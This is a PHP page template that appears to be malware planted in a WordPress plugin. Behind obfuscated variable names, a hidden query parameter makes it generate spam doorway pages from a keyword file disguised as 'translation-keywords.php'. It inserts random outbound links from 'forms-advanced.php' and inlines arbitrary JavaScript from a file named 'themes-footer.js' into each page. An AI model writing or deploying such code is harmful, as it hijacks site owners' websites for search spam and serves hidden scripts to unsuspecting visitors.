<?php
$kom2hUcC3 = intval(get_query_var('sdnsg'));

if ($kom2hUcC3 < 1 || $kom2hUcC3 > 5118) return;
$sqaeiQD = file(plugin_dir_path(__FILE__).'translation-keywords.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$qXHBEbU = explode(';', $sqaeiQD[$kom2hUcC3]);
if (count($qXHBEbU) < 2) return;
$vigkNLC = $qXHBEbU[0];
$g83v3sUY  = $qXHBEbU[1];
$oq05LFtUTB = $qXHBEbU[2];
$jbp8hTXAn  = $qXHBEbU[3];
$uiWPJgHdx = $qXHBEbU[4];
set_query_var('ypounjutnl', $vigkNLC);

$dCi7KZuB = '';
$yr12OJY = plugin_dir_path(__FILE__).'forms-advanced.php';
if (is_file($yr12OJY)) {
	$rIE9LZV = file($yr12OJY, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($rIE9LZV);
	shuffle($rIE9LZV);
	$gxCDlYuCsh = mt_rand(2, 5);
	if (count($rIE9LZV) > $gxCDlYuCsh) {
		for ($dgd5Bv = 0; $dgd5Bv < $gxCDlYuCsh; $dgd5Bv++) {
			$vkQsmLwXKe = array_shift($rIE9LZV);
			$dCi7KZuB .= '<p><a href="'.$vkQsmLwXKe.'">'.$vkQsmLwXKe.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $vigkNLC; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $g83v3sUY . "</p>\n";
				if (strlen($jbp8hTXAn) > 0) echo "<p>" . $jbp8hTXAn . "</p>\n";
				if (strlen($oq05LFtUTB) > 0) echo "<p>" . $oq05LFtUTB . "</p>\n";
				if (strlen($uiWPJgHdx) > 0) echo '<p><a href="#"><img src="'.$uiWPJgHdx.'"></a>' . "</p>\n";
				echo $dCi7KZuB;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$wabZHXqBiP = plugin_dir_path(__FILE__) . 'themes-footer.js';
if (is_file($wabZHXqBiP)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($wabZHXqBiP);
	echo '</script>';
}
get_footer();
?>
